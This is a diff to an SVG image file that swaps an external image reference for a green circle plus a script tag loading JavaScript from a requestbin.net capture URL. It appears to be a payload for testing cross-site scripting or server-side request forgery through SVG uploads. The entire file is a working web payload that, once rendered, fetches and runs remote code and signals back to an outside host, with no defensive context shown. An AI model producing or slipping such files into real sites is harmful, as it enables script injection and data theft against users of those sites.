@@ -1,4 +1,6 @@
-<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"> 
-<image height="30" width="30" 
-xlink:href="http://blog.star7ricks.ga/asd.svg" /> 
+<svg width="100%" height="100%" viewBox="0 0 100 100"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <circle cx="50" cy="50" r="45" fill="green"
+          id="foo" o="foo"/>
+  <script src="http://requestbin.net/r/uz0df1uz/script.js" type="text/javascript"/>
 </svg>
